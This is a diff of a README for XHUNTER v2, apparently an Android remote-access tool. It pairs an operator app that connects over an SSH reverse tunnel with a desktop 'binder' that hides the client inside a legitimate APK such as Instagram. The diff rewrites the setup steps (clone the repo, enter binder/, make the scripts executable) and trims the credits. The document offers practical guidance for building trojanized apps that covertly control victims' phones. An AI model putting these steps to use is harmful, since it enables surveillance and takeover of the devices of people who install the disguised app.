@@ -39,7 +39,7 @@ Use of **XHUNTER** against people or systems **without** clear **authorization**
 <!-- ABOUT THE PROJECT -->
 ## About the project (v2 demo)
 
-**v2** is a new distribution model vs older single-APK flows (e.g. `xhunter_1.6`–style all-in-one builds). This package (`xhunter-dist`) focuses on:
+**v2** is a new model vs older single-APK flows (e.g. `xhunter_1.6`–style all-in-one builds). Legacy in-app *build* flows were removed; the main repo is [anirudhmalik/xhunter](https://github.com/anirudhmalik/xhunter). This README focuses on:
 
 * A **host app** for your **operator** phone: **`xhunter-demo.apk`** (SSH **reverse** tunnel, client list, v2.0 **demo** badge in the UI).
 * A **desktop binder** in **`binder/`** (Bash + Java JAR): merge the **client** into a **host APK** (e.g. Instagram). Binding on-device is not practical — use a PC.
@@ -103,13 +103,17 @@ You need a **reachable server** and forwarding so a device running the merged ap
 
 ### 2) Binder: merge the client into a host APK (demo: Instagram)
 
-1. From the **distribution root** (next to `xhunter-demo.apk`):
+1. **Clone** the [xhunter](https://github.com/anirudhmalik/xhunter) repository, then go into the **`binder/`** directory at the repo root:
 
    ```bash
+   git clone https://github.com/anirudhmalik/xhunter.git
+   cd xhunter
    cd binder
    ```
 
-2. One-time:
+   You should see `setup.sh` and `config.txt` here, with `xhunter-demo.apk` in the **parent** directory (`..` from `binder`). *If you cloned to a custom folder name, `cd` into that folder before `cd binder`.*
+
+2. **One time:**
 
    ```bash
    chmod +x setup.sh binder.sh
@@ -209,7 +213,6 @@ If you have a suggestion that would make this better, please fork the repo and c
 
 * [Apktool](https://github.com/iBotPeaches/Apktool) — APK decode / build in the desktop binder  
 * [JSch](https://github.com/is/jsch) — SSH (common stack for Android + Java)  
-* Other stack components — see the main [xhunter](https://github.com/anirudhmalik/xhunter) application modules for the full set  
 
 ## License
 
